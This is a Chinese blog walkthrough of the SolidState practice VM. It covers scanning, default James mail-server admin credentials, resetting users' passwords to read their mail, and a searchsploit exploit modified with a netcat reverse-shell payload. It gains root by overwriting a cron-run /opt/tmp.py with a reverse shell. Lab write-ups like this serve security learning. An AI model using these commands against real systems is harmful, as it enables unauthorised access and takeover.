
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GuijiH6/p/18631357" title="发布于 2024-12-25 20:21">
    <span role="heading" aria-level="2">SolidState靶机通关教程及提权</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>声明！本文章及工具分享仅仅只是供大家学习交流为主，如有任何触犯法律的行为，均与本人及团队无关！！！</p>
</blockquote>
<p>工具链接：<a href="https://pan.quark.cn/s/33795a10039c" target="_blank" rel="noopener nofollow">https://pan.quark.cn/s/33795a10039c</a></p>
<h1 id="一靶机搭建">一、靶机搭建</h1>
<p>点击扫描虚拟机</p>
<p><img src="https://s2.loli.net/2024/12/22/51E6Bat9JXuc47K.png" alt="" loading="lazy"></p>
<p>选择靶机使在文件夹即可</p>
<p><img src="https://s2.loli.net/2024/12/22/FMnBwNVxT7hHaQz.png" alt="" loading="lazy"></p>
<p>建议kali和靶机的网络都使用<strong>NAT模式</strong></p>
<h1 id="二信息收集">二、信息收集</h1>
<h2 id="1-扫出ip信息">1. 扫出ip信息</h2>
<pre><code class="language-bash">nmap -sN 192.168.108.0/24
</code></pre>
<p>扫描结果：</p>
<p><img src="https://s2.loli.net/2024/12/22/4p3FmZvxgI7AUc6.png" alt="" loading="lazy"></p>
<p>排除kali自身，即<strong>192.168.108.138</strong>为靶机ip</p>
<h2 id="2-查找开放端口和服务信息">2. 查找开放端口和服务信息</h2>
<pre><code class="language-bash">nmap 192.168.108.138 -p 1-65535
nmap -sV 192.168.108.138
</code></pre>
<p>扫描结果：</p>
<p><img src="https://s2.loli.net/2024/12/22/C9UJvumwpgNfr1A.png" alt="" loading="lazy"></p>
<p>可用信息：</p>
<blockquote>
<p>22/tcp open ssh</p>
<p>25/tcp open smtp</p>
<p>80/tcp open http</p>
<p>110/tcp open pop3</p>
<p>119/tcp open nntp</p>
<p>4555/tcp open rsip</p>
</blockquote>
<h2 id="3-指纹探测找出系统版本信息">3. 指纹探测找出系统版本信息</h2>
<pre><code class="language-bash">nmap 192.168.108.138 -p 22,25,80,110,119,4555 -sV -sC -O --version-all 
</code></pre>
<p>结果如下</p>
<p><img src="https://s2.loli.net/2024/12/22/lqmkXwEWF38doQT.png" alt="" loading="lazy"></p>
<p>可用信息：</p>
<blockquote>
<p>Linux 3.2-4.9</p>
<p>CPE: cpe:/o:linux:linux_kernel</p>
</blockquote>
<h1 id="三寻找攻击点并攻击">三、寻找攻击点并攻击</h1>
<h2 id="1-寻找信息">1. 寻找信息</h2>
<p>访问开启的web端口，发现4555端口可能存在用户名密码登录</p>
<p><img src="https://s2.loli.net/2024/12/22/FK1v7YE6dGtAC9p.png" alt="" loading="lazy"></p>
<p>搜索相关漏洞，发现默认账号密码</p>
<p><img src="https://s2.loli.net/2024/12/22/m6ThKknQtSUlCIM.png" alt="" loading="lazy"></p>
<p>搜索此漏洞，有两个可以利用的脚本</p>
<pre><code class="language-php">searchsploit JAMES 2.3.2
</code></pre>
<p><img src="https://s2.loli.net/2024/12/22/PRrCzX7VcM9dx2u.png" alt="" loading="lazy"></p>
<p>下载下来备用</p>
<pre><code class="language-php">searchsploit -m 50347.py
python 50347.py -h
</code></pre>
<p><img src="https://s2.loli.net/2024/12/22/IK5F3ipEAhXe8OU.png" alt="" loading="lazy"></p>
<p>利用方式为</p>
<pre><code class="language-php">python 50347.py 靶机ip 攻击机ip 监听端口
</code></pre>
<h2 id="2-尝试攻击">2. 尝试攻击</h2>
<p>连接此端口，输入账号密码登录</p>
<pre><code class="language-bash">nc 192.168.108.138 4555
help
</code></pre>
<p><img src="https://s2.loli.net/2024/12/22/kJzrl9T8GUmbioR.png" alt="" loading="lazy"></p>
<p>以上是一个pop3的协议，翻译过来看看</p>
<pre><code>help：显示此帮助信息
listusers：显示现有账户
countusers：显示账户数量
adduser [用户名] [密码]：添加新用户
verify [用户名]：验证指定用户是否存在
deluser [用户名]：删除现有用户
setpassword [用户名] [密码]：设置用户密码
setalias [用户] [别名]：将 ' 用户 ' 的所有邮件本地转发到 ' 别名'
showalias [用户名]：显示用户的当前邮件别名
unsetalias [用户]：取消 ' 用户 ' 的别名
setforwarding [用户名] [邮箱地址]：将用户的邮件转发到另一个邮箱地址
showforwarding [用户名]：显示用户当前的邮件转发设置
unsetforwarding [用户名]：取消转发
user [存储库名]：切换到另一个用户存储库
shutdown：关闭当前 JVM（当 James 作为守护进程运行时很方便）
quit：关闭连接
</code></pre>
<p>执行命令</p>
<pre><code class="language-bash">listusers
setpassword 账号名
</code></pre>
<p>更改所有账户的密码为1，留着备用</p>
<p><img src="https://s2.loli.net/2024/12/22/aAM718mvcTxbXLF.png" alt="" loading="lazy"></p>
<p>先看看<strong>telnet</strong>连接后的命令使用，大小写任意</p>
<pre><code>USER: 提供用户名以进行身份验证。
PASS: 提供密码以进行身份验证。
LIST: 列出邮件。
RETR: 查看或下载指定邮件。
DELE: 删除指定邮件。
QUIT: 结束会话。
</code></pre>
<p>再看看回显信息</p>
<pre><code>user 用户名: 这是用来输入用户名的命令。
+OK: 服务器确认接收用户名。
pass 密码: 这是用来输入密码的命令。
+OK Welcome 用户名: 服务器确认密码正确，并欢迎用户。
-ERR：表示返回错误
list: 这是一个常见的邮件协议命令，用于列出邮件信息，如邮件数量及其大小。
+OK 1 743: 服务器响应，表示成功获取信息，通常会返回邮件的数量和大小，1代表一个邮件，743代表字节大小
</code></pre>
<p>利用telnet命令连接，因为前两个用户并没有邮箱信息，所以就不放截图了，这里看john用户，查看邮件信息</p>
<pre><code>telnet ip
user john
pass 1
retr 1
</code></pre>
<p><img src="https://s2.loli.net/2024/12/22/b4UGnQioBuPCJqp.png" alt="" loading="lazy"></p>
<p>发现提示我们去看mindy账户，同样的方式访问mindy账户，在第二个邮件里发现登录名和密码</p>
<p><img src="https://s2.loli.net/2024/12/22/FIDnJzUaXT91yHr.png" alt="" loading="lazy"></p>
<blockquote>
<p>账号：mindy</p>
<p>密码：P@55W0rd1!2@</p>
</blockquote>
<h2 id="3-ssh登录并利用">3. ssh登录并利用</h2>
<p>尝试ssh登录</p>
<pre><code class="language-php">ssh mindy@192.168.108.138
</code></pre>
<p><img src="https://s2.loli.net/2024/12/22/jSmRHb2z3Quf5ie.png" alt="" loading="lazy"></p>
<p>-rbash：被限制的bash，此bash命令被限制，按两次<strong>tab</strong>看看有什么命令可以用</p>
<p><img src="https://s2.loli.net/2024/12/22/WRLsptxEyieJGNg.png" alt="" loading="lazy"></p>
<p>看看etc/passwd里面有什么sh可以利用</p>
<p><img src="https://s2.loli.net/2024/12/22/xebRvS76wjiTG31.png" alt="" loading="lazy"></p>
<p>可以尝试利用mindy的rbash进行<strong>shell反弹</strong></p>
<h2 id="4-脚本利用">4. 脚本利用</h2>
<p>编辑刚才的脚本，修改一下</p>
<pre><code class="language-php">vim 50347.py
pyload = 'nc -e bin/sh 攻击机ip 监听端口'
</code></pre>
<p><img src="https://s2.loli.net/2024/12/22/bjevFugdVs9Q2Mk.png" alt="" loading="lazy"></p>
<p>先执行一下脚本</p>
<pre><code class="language-php">python3 50347.py 192.168.108.138 192.168.108.130 4444
</code></pre>
<p><img src="https://s2.loli.net/2024/12/22/coliBFsNzQAG8gX.png" alt="" loading="lazy"></p>
<h2 id="5-获得完整权限">5. 获得完整权限</h2>
<p>一个面板执行ssh登录，一个面板监听</p>
<p><img src="https://s2.loli.net/2024/12/22/sZlyvjPeKxM8IXE.png" alt="" loading="lazy"></p>
<p>成功获得</p>
<p><img src="https://s2.loli.net/2024/12/22/iNoytw38YOpUDce.png" alt="" loading="lazy"></p>
<h1 id="四提权">四、提权</h1>
<p>因为是james账户提示的mindy，所以看看进程</p>
<p><img src="https://s2.loli.net/2024/12/22/XZqiIgaskyotSRc.png" alt="" loading="lazy"></p>
<p>发现可疑信息<strong>opt文件夹</strong></p>
<pre><code class="language-php">cd opt
ls -ll
cat tmp.py
</code></pre>
<p>这个代码的意思是定期删除/tmp目录下的内容</p>
<p><img src="https://s2.loli.net/2024/12/22/d1UzN38L2xbwMFA.png" alt="" loading="lazy"></p>
<p>写个反弹shell提权，并开启端口监听</p>
<pre><code class="language-php">echo 'import os; os.system("/bin/nc 192.168.108.130 9999 -e /bin/bash")' &gt; /opt/tmp.py
cat tmp.py
python tmp.py
</code></pre>
<p><img src="https://s2.loli.net/2024/12/22/UwFuKfNG6JZzBcV.png" alt="" loading="lazy"></p>
<p>此时即可获得root权限</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.4108731499641204" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2024-12-25 20:21">2024-12-25 20:21</span>&nbsp;
<a href="https://www.cnblogs.com/GuijiH6">H轨迹H</a>&nbsp;
阅读(<span id="post_view_count">7</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18631357" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18631357);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18631357', targetLink: 'https://www.cnblogs.com/GuijiH6/p/18631357', title: 'SolidState靶机通关教程及提权' })">举报</a>
</div>
        